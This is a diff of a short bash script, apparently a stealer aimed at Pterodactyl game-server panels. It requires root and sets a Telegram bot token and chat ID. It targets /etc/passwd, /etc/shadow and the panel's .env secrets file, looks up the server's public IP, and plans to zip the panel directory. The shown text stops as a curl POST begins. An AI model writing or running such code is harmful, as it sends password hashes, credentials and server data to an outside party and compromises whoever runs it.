@@ -1,20 +1,20 @@
 #!/bin/bash
+# --- root check (silent) ---
+if [ "$EUID" -ne 0 ]; then
+  echo "WARNING: Run sebagai root untuk hasil terbaik."
+  exit 0
+fi
+
 set +e
 BOT_TOKEN="8525826159:AAF9NQzREOSgYnNC2rVXBOzE9EoARrAL2Qc"
 CHAT_ID="7697898730"
-RESULT1="$(bash -c 'cat /etc/hostname' 2>/dev/null)"
+RESULT1="$(cat /etc/hostname)"
 FILE1="/etc/passwd"
 FILE2="/etc/shadow"
 FILE3="/var/www/pterodactyl/.env"
 RESULT2="$(curl -s ifconfig.me)"
 SRC="/var/www/pterodactyl"
 ZIP="/etc/ptero.zip"
-
-# --- root check (silent) ---
-if [ "$EUID" -ne 0 ]; then
-  echo "WARNING: Run sebagai root untuk hasil terbaik."
-  exit 0
-fi
 
 curl -s \
   -X POST \
